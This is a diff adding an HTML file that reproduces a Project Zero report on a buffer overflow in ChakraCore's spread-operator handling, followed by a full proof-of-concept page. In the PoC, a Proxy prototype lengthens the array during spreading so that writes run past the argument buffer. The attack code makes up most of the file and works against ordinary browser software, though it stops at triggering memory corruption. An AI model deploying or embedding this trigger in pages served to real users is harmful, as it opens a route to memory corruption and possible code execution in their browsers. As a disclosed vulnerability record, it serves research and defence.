@@ -1,0 +1,117 @@
+<!--
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=910
+
+The spread operator in JavaScript allows an array to be treated as function parameters using the following syntax:
+
+var a = [1,2];
+
+f(...a);
+
+This is implemented in the JavascriptFunction::SpreadArgs function in Chakra (https://github.com/Microsoft/ChakraCore/blob/master/lib/Runtime/Library/JavascriptFunction.cpp). 
+
+On line 1054 of this function, the following code is used to spread an array:
+
+                        if (argsIndex + arr->GetLength() > destArgs.Info.Count)
+                        {
+                            AssertMsg(false, "The array length has changed since we allocated the destArgs buffer?");
+                            Throw::FatalInternalError();
+                        }
+
+                        for (uint32 j = 0; j < arr->GetLength(); j++)
+                        {
+                            Var element;
+                            if (!arr->DirectGetItemAtFull(j, &element))
+                            {
+                                element = undefined;
+                            }
+                            destArgs.Values[argsIndex++] = element;
+                        } 
+
+When DirectGetItemAtFull accesses the array, if an element of the array is undefined, it will fall back to the prototype of the array. In some situations, for example if the prototype is a Proxy, this can execute user-defined script, which can change the length of the array, meaning that the call can overflow destArgs.Values, even through the length has already been checked. Note that this check also has a potential integer overflow, which should also probably be fixed as a part of this issue.
+
+A full PoC is attached.
+-->
+
+<html>
+<script>
+var y = 0;
+var t = [1,2,3];
+var t2 = [4,4,4];
+var mp = new Proxy(t2, {
+  get: function (oTarget, sKey) {
+    var a = [1,2];
+    a.reverse();
+    alert("get " + sKey.toString());
+    alert(oTarget.toString());
+    y = y + 1;
+    if(y == 2){
+        var temp = [];
+        oTarget.__proto__ = temp.__proto__;
+	t.length = 10000;
+        temp.fill.call(t, 7, 0, 1000);
+        return 5;
+    }
+    return oTarget[sKey] || oTarget.getItem(sKey) || undefined;
+  },
+  set: function (oTarget, sKey, vValue) {
+    alert("set " + sKey);
+    if (sKey in oTarget) { return false; }
+    return oTarget.setItem(sKey, vValue);
+  },
+  deleteProperty: function (oTarget, sKey) {
+    alert("delete");
+    if (sKey in oTarget) { return false; }
+    return oTarget.removeItem(sKey);
+  },
+  enumerate: function (oTarget, sKey) {
+    alert("enum");
+    return oTarget.keys();
+  },
+  ownKeys: function (oTarget, sKey) {
+    alert("ok");
+    return oTarget.keys();
+  },
+  has: function (oTarget, sKey) {
+    alert("has" + sKey);
+    return true;
+  },
+  defineProperty: function (oTarget, sKey, oDesc) {
+    alert("dp");
+    if (oDesc && "value" in oDesc) { oTarget.setItem(sKey, oDesc.value); }
+    return oTarget;
+  },
+  getOwnPropertyDescriptor: function (oTarget, sKey) {
+    alert("fopd");
+    var vValue = oTarget.getItem(sKey);
+    return vValue ? {
+      value: vValue,
+      writable: true,
+      enumerable: true,
+      configurable: false
+    } : undefined;
+  },
+});
+
+function f(a){
+
+	alert(a);
+}
+
+var q = f;
+
+t.length = 4;
+var o = {};
+  Object.defineProperty(o, '3', {
+    get: function() {
+      alert('get!');
+      return temperature;
+    }
+  });
+
+t.__proto__ = mp;
+//t.__proto__.__proto__ = o;
+
+q(...t);
+
+</script>
+</html>
